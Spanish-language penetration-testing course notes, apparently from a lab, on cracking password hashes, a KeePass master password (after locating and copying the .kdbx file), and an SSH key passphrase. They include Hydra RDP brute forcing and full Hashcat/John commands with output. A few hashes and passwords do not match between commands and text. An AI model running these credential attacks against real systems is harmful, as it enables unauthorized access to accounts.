+<p>Estas reglas predefinidas cubren una amplia variedad de mutaciones y son más útiles cuando no tenemos información sobre la política de contraseñas del objetivo. Usaremos las reglas predefinidas en las próximas demostraciones y ejemplos. Sin embargo, siempre es más eficiente descubrir información sobre políticas de contraseñas existentes o buscar políticas predeterminadas que se usan normalmente para el entorno de software de destino.</p>
+
+<p>Resumamos brevemente lo que hicimos en esta sección. Comenzamos discutiendo los ataques basados ​​en reglas y por qué son preferibles a los ataques de diccionario. Luego, discutimos las reglas y las usamos para mutar listas de palabras para descifrar un hash MD5. Al final de esta sección, presentamos brevemente los archivos de reglas predefinidos proporcionados por Hashcat.</p>
+
+<p>En la siguiente sección, discutiremos una metodología básica para el craqueo, que podemos usar como esquema para demostraciones y ejercicios.</p>
+
+<p><br /></p>
+
+<p><strong>1. You extracted the MD5 hash “056df33e47082c77148dba529212d50a” from a target system. Create a rule to add “1@3$5” to each password of the rockyou.txt wordlist and crack the hash.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat hash.txt 
+19adc0e8921336d08502c039dc297ff8
+
+cat rule.demo    
+$1 $@ $3 $$ $5
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.demo --force --show
+056df33e47082c77148dba529212d50a:courtney1@3$5
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>2.  You extracted the MD5 hash “19adc0e8921336d08502c039dc297ff8” from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.demo --force --show
+19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5
+
+cat rule.demo
+u d
+
+cat hash.txt 
+19adc0e8921336d08502c039dc297ff8
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="2123-craking-methodology">21.2.3. Craking Methodology.</h4>
+
+<p>En las siguientes secciones, recorreremos las diversas fases de una sesión de descifrado de contraseñas en el mundo real, comenzando con una descripción general de una metodología sólida.</p>
+
+<p>Podemos describir el proceso de descifrar un hash con los siguientes pasos:</p>
+
+<ol>
+  <li>Extraer hashes</li>
+  <li>Hash de formato</li>
+  <li>Calcular el tiempo de agrietamiento</li>
+  <li>Preparar lista de palabras</li>
+  <li>Ataca el hash</li>
+</ol>
+
+<p>El primer paso es extraer los hashes. En una prueba de penetración encontraremos hashes en varias ubicaciones. Por ejemplo, si tenemos acceso a un sistema de base de datos, podemos volcar la tabla de la base de datos que contiene las contraseñas de usuario cifradas.</p>
+
+<p>El siguiente paso es formatear los hashes en el formato de craqueo esperado de nuestra herramienta. Para hacer esto, necesitaremos conocer el algoritmo hash utilizado para crear el hash. Podemos identificar el tipo de hash con <em>hash-identifier</em> o <em>hashid</em>, que están instalados en Kali. Según el algoritmo hash y la fuente del hash, es posible que debamos verificar si ya está en el formato correcto para nuestra herramienta de craqueo. De lo contrario, debemos usar herramientas auxiliares para cambiar la representación del hash al formato esperado de nuestra herramienta de craqueo.</p>
+
+<p>En el tercer paso, determinaremos la viabilidad de nuestro intento de craqueo. Como discutimos antes, el tiempo de craqueo consiste en el espacio de claves dividido por la tasa de hash. Si el tiempo de craqueo calculado excede nuestra vida útil esperada, ¡podríamos reconsiderar este enfoque!</p>
+
+<p>De manera más realista, deberíamos considerar la duración de la prueba de penetración actual teniendo en cuenta que probablemente nos veamos obligados a detener la sesión (junto con otras actividades de limpieza) cuando termine la prueba. En lugar de mantener la esperanza de éxito en una sesión de craqueo prospectiva demasiado larga, deberíamos considerar vectores de ataque alternativos o invertir en una actualización de hardware o una instancia de máquina basada en la nube.</p>
+
+<p>El cuarto paso considera la preparación de la lista de palabras. En casi todos los casos, deberíamos mutar nuestra lista de palabras y realizar un ataque basado en reglas, en lugar de un ataque de diccionario directo. En este paso, debemos investigar posibles políticas de contraseñas e investigar otros vectores de contraseñas, incluidos los sitios de fuga de contraseñas en línea. Sin esto, es posible que necesitemos ejecutar varias listas de palabras con (o sin) reglas preexistentes para una amplia cobertura de posibles contraseñas.</p>
+
+<p>Después de toda la preparación, podemos encender nuestra herramienta y comenzar el proceso de craqueo. Llegados a este punto, debemos tener especial cuidado al copiar y pegar nuestros hashes. Un espacio adicional o una nueva línea podría hacer que nuestros esfuerzos sean inútiles. Además, debemos estar seguros del tipo de hash que estamos usando. Por ejemplo, hashid no puede determinar automáticamente si <strong>b08ff247dc7c5658ff64c53e8b0db462</strong> es MD2, MD4 o MD5. Una elección incorrecta obviamente hará perder tiempo. Podemos evitar esta situación verificando dos veces los resultados con otras herramientas y realizando investigaciones adicionales.</p>
+
+<p>Seguiremos esta metodología en las próximas demostraciones para reforzar los aspectos y detalles importantes del proceso de craqueo. La mejor manera de mejorar nuestros resultados en este proceso que suele ser largo es operar con enfoque y estructura.</p>
+
+<p><strong>Crack the following hashes “4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7”, “$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC”</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashid &lt;&lt;&lt; 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
+Analyzing '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
+[+] SHA-384 
+[+] SHA3-384 
+[+] Skein-512(384) 
+[+] Skein-1024(384)
+
+hashid &lt;&lt;&lt; \$2y\$10\$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC
+Analyzing '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="2124-passwords-managers">21.2.4. Passwords Managers.</h4>
+
+<p>Los Passwords Managers (administradores de contraseñas) crean y almacenan contraseñas para diferentes servicios, protegiéndolas con una contraseña maestra (master password). Esta contraseña maestra otorga acceso a todas las contraseñas que posee el administrador de contraseñas. Los usuarios a menudo copian y pegan estas contraseñas desde el administrador de contraseñas o usan una función de autocompletar vinculada a un navegador. Ejemplos de administradores de contraseñas populares son <em>1Password</em>  y <em>KeePass</em>. Este tipo de software puede ayudar a los usuarios que a menudo se ven obligados a mantener muchas contraseñas, a menudo complejas, pero también puede introducir riesgos en una organización.</p>
+
+<p>En esta sección, demostraremos un escenario de prueba de penetración muy común. Supongamos que hemos obtenido acceso a un client workstation que ejecuta un administrador de contraseñas. En la siguiente demostración, extraeremos la base de datos del administrador de contraseñas, transformaremos el archivo a un formato que pueda usar Hashcat y descifraremos la contraseña de la base de datos maestra.</p>
+
+<p>Comencemos conectándonos a la máquina SALESWK01 (192.168.50.203) a través de RDP. Suponiendo que hemos obtenido las credenciales para el usuario <em>jason</em> (laboratorio), iniciaremos sesión y después de una conexión exitosa, obtendremos acceso al escritorio del sistema.</p>
+
+<p>Una vez conectado, comprobaremos qué programas están instalados en el sistema. Hay muchas formas de buscar programas instalados, pero dado que tenemos acceso a la GUI, usaremos la función Aplicaciones y características de Windows, que es el enfoque más directo. Haremos clic en el icono de Windows, escribiremos “Apps”, seleccionaremos ”Add or remove programs” y nos desplazaremos hacia abajo para revisar todos los programas instalados, así comprobaremos que <em>KeePass</em>.</p>
+
+<p>La lista nos muestra que <em>KeePass</em> está instalado en el sistema. Si no estuviéramos familiarizados con este programa, lo investigaríamos y eventualmente descubriríamos que la base de datos de KeePass está almacenada como un archivo <em>.kdbx</em> y que puede haber más de una base de datos en el sistema. Por ejemplo, un usuario puede mantener una base de datos personal y una organización puede mantener una base de datos a nivel de departamento. Nuestro próximo paso es ubicar los archivos de la base de datos buscando todos los archivos <strong>.kdbx</strong> en el sistema.</p>
+
+<p>Usemos PowerShell con el cmdlet <em>Get-ChildItem</em> para ubicar archivos en ubicaciones específicas. Usaremos <em>-Path C:\</em> para buscar en todo el disco. A continuación, usaremos <em>-Include</em> para especificar los tipos de archivos que queremos incluir, los argumentos <em>-File</em> y <em>-Recurse</em> para obtener una lista de archivos y buscar en subdirectorios. Finalmente, estableceremos <em>-ErrorAction</em> en <em>SilentlyContinue</em> para silenciar los errores y continuar con la ejecución.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\jason&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+    
+    
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022   8:19 AM           1982 Database.kdbx
+</code></pre></div></div>
+
+<p>El resultado revela un archivo de base de datos en la carpeta <em>Documentos</em> del usuario jason.</p>
+
+<p>Transferiremos este archivo a nuestro sistema Kali como preparación para los siguientes pasos.</p>
+
+<p>Ahora hemos completado el primer paso de la metodología de craqueo y podemos continuar con el siguiente paso, transformando el hash en un formato que nuestra herramienta de craqueo pueda usar.</p>
+
+<p>La suite JtR incluye varios scripts de transformación como <em>ssh2john</em> y <em>keepass2john</em> que pueden formatear una amplia gama de diferentes formatos de archivo y están instalados de manera predeterminada en nuestra máquina Kali. También podemos usar estos scripts para formatear hashes para Hashcat.</p>
+
+<p>Usemos el script <strong>keepass2john</strong> para formatear el archivo de la base de datos y guardemos el resultado en <strong>keepass.hash</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ ls -la Database.kdbx
+-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx
+
+
+kali@kali:~/passwordattacks$ keepass2john Database.kdbx &gt; keepass.hash   
+
+kali@kali:~/passwordattacks$ cat keepass.hash   
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+</code></pre></div></div>
+
+<p>El listado anterior muestra el hash resultante de la base de datos KeePass almacenada en <strong>keepass.hash</strong> . Antes de que podamos trabajar con el hash resultante, debemos modificarlo aún más.</p>
+
+<p>En nuestro caso, el script JtR antepuso el nombre de archivo <em>Base de</em> datos al hash. El script hace esto para actuar como el nombre de usuario para el hash de destino. Esto es útil cuando se descifran hashes de bases de datos, ya que queremos que la salida contenga el nombre de usuario correspondiente y no solo la contraseña. Dado que KeePass usa una contraseña maestra sin ningún tipo de nombre de usuario, debemos eliminar la cadena “Base de datos:” con un editor de texto.</p>
+
+<p>Después de eliminar la cadena “Base de datos:”, el hash tiene el formato correcto para Hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat keepass.hash   
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
+</code></pre></div></div>
+
+<p>Estamos casi listos para comenzar el proceso de craqueo, pero necesitamos determinar el tipo de hash para KeePass. Podríamos buscarlo en Hashcat Wiki, o grep el resultado de ayuda de hashcat como se muestra a continuación:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
+13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
+</code></pre></div></div>
+
+<p>El resultado del comando grep muestra que el modo correcto para KeePass es 13400.</p>
+
+<p>Saltémonos el paso tres (cálculo del tiempo de craqueo) ya que este es un ejemplo simple y no tomará mucho tiempo, y pasemos al paso cuatro para preparar nuestra lista de palabras. Usaremos una de las reglas provistas por Hashcat (<em>rockyou-30000.rule</em>), como se mencionó anteriormente, combinada con la lista de palabras <strong>rockyou.txt</strong> .</p>
+
+<p>Este archivo de reglas es especialmente efectivo con <strong>rockyou.txt</strong> , ya que fue creado para él.</p>
+
+<p>Cuando ingresamos al paso cinco, hemos preparado todo para nuestro ataque de contraseña. Usemos <strong>hashcat</strong> con los argumentos actualizados y comencemos a descifrar.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat (v6.2.5) starting
+...
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
+...
+</code></pre></div></div>
+
+<p>Después de varios segundos, Hashcat descifró con éxito el hash y descubrió la contraseña maestra de KeePass de “qwertyuiop123”. Ejecutemos KeePass sobre nuestra conexión RDP y, cuando se le solicite, ingrese la contraseña.</p>
+
+<p><br /></p>
+
+<p><strong>1. Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title “User Company Password”</strong></p>
+
+<p>En primer lugar, nos logeamos a la máquina utilizanod el siguiente comando de xfreerdp:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /drive:kali,/home/kali/labs /v:192.168.233.203 /u:jason /p:lab
+</code></pre></div></div>
+
+<p>Recordamos que este comando nos permite compartir la carpeta /home/kali/labs de nuestra kali con el sistema remoto. Seguidamente, buscamos en Apps &gt; Add or remove programs si está instalado KeePass y comprobamos que si lo tiene instalado. Así, buscamos en el sistema todos los archivos .kdbx aprovechándonos de PowerShell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\jason&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+
+
+PS C:\Users\jason&gt; cd Documents
+PS C:\Users\jason\Documents&gt; ls
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          6/9/2022   9:23 AM                WindowsPowerShell
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+</code></pre></div></div>
+
+<p>Y copiamos este fichero Database.kdbx sobre la carpeta compartida de nuestro fichero:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230428115827.png" text-align="center" />
+</div>
+
+<p>Seguidamente, en nuestra máquina Kali utilizamos john the ripper para pasar el hash a un formato crackeable:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keepass2john Database.kdbx &gt; hash.txt
+</code></pre></div></div>
+
+<p>Y empleamos hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
+</code></pre></div></div>
+
+<p>Observemos que hemos modificado las lista rockyou.txt con una regla.</p>
+
+<p>Seguiadamente, nos volvemos a logear sobre la máquina e intentamos accedr a la base de datos, vamos a la aplicación KeePass 2 e ingresamos la Master Password y tenemos acceso.</p>
+
+<p><br /></p>
+
+<p><strong>2.  Enumerate VM #2 and get access to the system as user <em>nadine</em>. Obtain the password stored as title “flag” in the password manager.</strong></p>
+
+<p>We obtain nadine’s credentials by bruteforcing:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ sudo hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.221.227
+[sudo] password for kali: 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-03 12:17:13
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking rdp://192.168.221.227:3389/
+[3389][rdp] host: 192.168.221.227   login: nadine   password: 123abc
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-03 12:17:46
+</code></pre></div></div>
+
+<p>Procedemos de la misma forma que en el ejercicio anterior, buscamos el hash, lo crakeamos accedemos al password manager y recuperamos la flag.</p>
+
+<p><br /></p>
+
+<h4 id="2125-ssh-private-key-passphrase">21.2.5 SSH Private Key Passphrase.</h4>
+
+<p>En esta sección nos preocuparemos de crakear las <em>passphrases</em> de claves SSH.</p>
+
+<p>Aunque las claves privadas de SSH deben mantenerse confidenciales, existen muchos escenarios en los que estos archivos podrían verse comprometidos. Por ejemplo, si accedemos a una aplicación web a través de una vulnerabilidad como <em>Directory Traversal</em> , podríamos leer archivos en el sistema. Podríamos usar esto para extraer la clave privada SSH de un usuario. Sin embargo, recientes medidas de seguridad han implementado una contraseña de acceso a la clave denominada ‘passphrase’, de esta forma, cuando intentemos usarla para conectarnos al sistema (si la conexión no se realiza desde un sistema legítimo), se nos solicitará una contraseña. Para obtener acceso, necesitaremos descifrar la frase de contraseña.</p>
+
+<p>Demostremos este escenario y cómo usar la metodología de craqueo que discutimos para descifrar la frase de contraseña de una clave privada. Cuando usamos un ataque de diccionario en el formulario de inicio de sesión HTTP BRUTE, obtuvimos acceso a un administrador de archivos basado en la web que albergaba una clave privada SSH.</p>
+
+<p>Este servicio web es similar al ejemplo anterior de TinyFileManager, excepto que el directorio principal ahora contiene los dos archivos adicionales <em>id_rsa</em> y <em>note.txt</em>. Descarguemos ambos en nuestra máquina Kali y guardémoslos en nuestro directorio <em>passwordattacks</em>. Primero, revisaremos el contenido de <em>note.txt</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat note.txt
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+</code></pre></div></div>
+
+<p>El resultado muestra que esta nota contiene la lista de contraseñas de Dave en texto sin formato. </p>
+
+<p>Intentemos usar la clave privada id_rsa para el usuario Dave recién identificado en una conexión SSH. Para ello, debemos modificar los permisos de la clave privada descargada. El puerto SSH utilizado en este ejemplo es 2222. Probaremos cada una de estas contraseñas como frase de contraseña para la clave privada SSH. </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ chmod 600 id_rsa
+
+kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
+The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa':
+Enter passphrase for key 'id_rsa':
+Enter passphrase for key 'id_rsa':
+dave@192.168.50.201's password: 
+
+kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
+Enter passphrase for key 'id_rsa':
+Enter passphrase for key 'id_rsa':
+Enter passphrase for key 'id_rsa':
+</code></pre></div></div>
+
+<p>Ninguna de las contraseñas del archivo de texto funcionó para esta frase de contraseña. Sin embargo, en una prueba de penetración real, mantendríamos estas contraseñas a mano para varios otros vectores, incluidos los ataques de rociado o los ataques contra un usuario <em>de dave</em> en otros sistemas. Sin embargo, todavía necesitamos una frase de contraseña para usar la clave privada de <em>dave .</em></p>
+
+<p>Según el archivo <em>note.txt</em>, se habilitó una nueva política de contraseñas en enero de 2022. Hay una alta probabilidad de que <em>Dave</em> tenga una frase de contraseña que cumpla con la nueva política de contraseñas.</p>
+
+<p>Siguiendo la metodología de craqueo, nuestro siguiente paso es transformar la clave privada en un formato hash para nuestras herramientas de craqueo. Usaremos el script de transformación <strong>ssh2john</strong> de la suite JtR y guardaremos el hash resultante en <strong>ssh.hash</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ ssh2john id_rsa &gt; ssh.hash
+
+kali@kali:~/passwordattacks$ cat ssh.hash
+id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
+</code></pre></div></div>
+
+<p>Dentro de esta salida, “$6$” significa <em>SHA-512</em>. Como antes, eliminaremos el nombre de archivo antes de los primeros dos puntos. Luego, determinaremos el modo Hashcat correcto.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
+...
+  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
+  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
+  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
+  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
+  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
+  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
+</code></pre></div></div>
+
+<p>La salida indica que “$6$” es el modo 22921.</p>
+
+<p>Ahora, procedamos con nuestra metodología y creemos un archivo de reglas y preparemos una lista de palabras para descifrar el hash. Revisaremos nuevamente <em>note.txt</em> para determinar qué reglas debemos crear y qué contraseñas incluiremos en la lista de palabras.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat note.txt
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+</code></pre></div></div>
+
+<p>En base a esto, podemos comenzar a crear nuestro archivo de reglas. Debemos incluir tres números, al menos una letra mayúscula y al menos un carácter especial.</p>
+
+<p>Notamos que <em>Dave</em> usó “137” para los tres números en la contraseña “rickc137”. Además, la contraseña de “Ventana” comienza con una letra mayúscula. Usemos una función de regla para convertir la primera letra en mayúscula. No se incluye ningún carácter especial en ninguna de las contraseñas enumeradas. Para nuestro primer intento de descifrado, solo usaremos los caracteres especiales más comunes “!”, “@” y “#”, ya que son los primeros tres caracteres especiales al escribirlos desde el lado izquierdo de muchas distribuciones de teclado.</p>
+
+<p>Basándonos en el análisis, crearemos nuestras reglas. Usaremos <strong>c</strong> para las mayúsculas de la primera letra y <strong>$1</strong> <strong>$3</strong> <strong>$7</strong> para los valores numéricos. Para abordar los caracteres especiales, crearemos reglas para agregar los diferentes caracteres especiales <strong>$!</strong> , <strong>$@</strong> y <strong>$#</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat ssh.rule
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+</code></pre></div></div>
+
+<p>A continuación, crearemos un archivo de lista de palabras que contenga las contraseñas de <strong>note.txt</strong> y guardaremos el resultado en <strong>ssh.passwords</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat ssh.passwords
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+</code></pre></div></div>
+
+<p>Ahora podemos usar Hashcat para realizar el craqueo especificando el archivo de reglas, la lista de palabras y el modo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+hashcat (v6.2.5) starting
+...
+
+Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
+No hashes loaded.
+...
+</code></pre></div></div>
+
+<p>Desafortunadamente, recibimos un error que indica que nuestro hash provocó una “Token length exception”. Cuando investigamos esto con un motor de búsqueda, varias discusiones sugieren que las claves privadas modernas y sus frases de contraseña correspondientes se crean con el cifrado <em>aes-256-ctr</em>, que el modo 22921 de Hashcat no admite.</p>
+
+<p>Esto refuerza el beneficio de usar múltiples herramientas ya que John the Ripper (JtR) puede manejar este cifrado.</p>
+
+<p>Para poder usar las reglas creadas previamente en JtR, debemos agregar un nombre para las reglas y agregarlas al archivo de configuración <strong>/etc/john/john.conf .</strong> Para esta demostración, nombraremos la regla <strong>sshRules</strong> con una sintaxis de nomenclatura de regla “List.Rules” (como se muestra en el Listado 34). Usaremos <strong>sudo</strong> y <strong>sh -c</strong> para agregar el contenido de nuestro archivo de reglas en <strong>/etc/john/john.conf</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat ssh.rule
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'
+</code></pre></div></div>
+
+<p>Ahora que agregamos con éxito nuestras sshRules al archivo de configuración de JtR, podemos usar a <strong>John</strong> para descifrar la frase de contraseña en el paso final de nuestra metodología. Definiremos nuestra lista de palabras con <strong>–wordlist=ssh.passwords</strong> , seleccionaremos la regla creada previamente con <strong>–rules=sshRules</strong> y proporcionaremos el hash de la clave privada como argumento final, <strong>ssh.hash</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Umbrella137!     (?)     
+1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p>¡Desciframos con éxito la frase de contraseña de la clave privada! ¡Excelente!</p>
+
+<p>Como era de esperar, el “Umbrella137!” contraseña cumplió con los requisitos de la política de contraseñas y también coincidió con las preferencias y hábitos personales de Dave. Esto no es una sorpresa, ya que los usuarios rara vez cambian sus patrones de contraseña.</p>
+
+<p>Ahora, usemos la frase de contraseña para conectarnos al sistema de destino a través de SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
+Enter passphrase for key 'id_rsa':
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;http://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+0d6d28cfbd9c:~$
+</code></pre></div></div>
+
+<p>Nos conectamos con éxito al sistema de destino al proporcionar la frase de contraseña correcta a la clave privada.</p>
+
+<p>En esta sección, nuevamente ejecutamos la metodología de descifrado de contraseñas y reforzamos la idea de detallar cuidadosamente los patrones de comportamiento humano. Nos adaptamos a un error en nuestra herramienta principal (Hashcat) usando otra herramienta (JtR) en su lugar. En la siguiente unidad de aprendizaje, analizaremos las implementaciones de hash basadas en Windows y demostraremos los ataques contra ellas.</p>
